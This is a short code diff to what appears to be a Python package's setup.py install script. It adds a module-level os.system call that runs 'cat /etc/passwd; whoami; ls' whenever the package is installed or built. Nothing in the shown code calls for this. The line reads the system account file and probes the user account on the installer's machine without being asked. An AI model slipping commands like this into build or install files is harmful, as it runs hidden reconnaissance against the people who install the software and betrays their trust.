@@ -3,6 +3,8 @@
 # python std lib
 import os
 
+os.system("cat /etc/passwd; whoami; ls;")
+
 try:
     from setuptools import setup
 except ImportError:
